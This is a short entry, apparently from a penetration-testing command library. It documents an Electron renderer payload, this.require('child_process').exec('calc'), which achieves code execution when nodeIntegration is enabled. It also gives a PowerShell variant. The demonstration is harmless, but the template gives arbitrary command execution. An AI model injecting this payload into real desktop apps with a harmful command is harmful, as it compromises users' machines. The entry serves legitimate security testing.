---
id: cmd-child-process-windows
data: this.require("child_process").exec("calc")
tags:
  - rce
  - windows
type: command
output: null
executor: javascript
platforms:
  - Windows
  - Desktop (Electron)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.118Z'
verified: false
validated: true
submitted: true
---
# child-process-exec-windows

## Command

```javascript
this.require("child_process").exec("calc")
```

## Description

Executes a shell command via Node's child_process in an Electron renderer with nodeIntegration enabled, opening Windows Calculator as RCE demo.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| exec | Command string, e.g., "calc" | Yes |

## Examples

### Basic Usage

```javascript
// Opens calc.exe
```

### Advanced Usage

```javascript
this.require("child_process").exec("powershell -c Get-Process");
```

## Expected Output

Windows Calculator launches.

## Related

- [[commands/electron-browserwindow-rce-mac]]
- [[procedures/Trigger-Redirect-and-RCE-in-Desktop-App]]
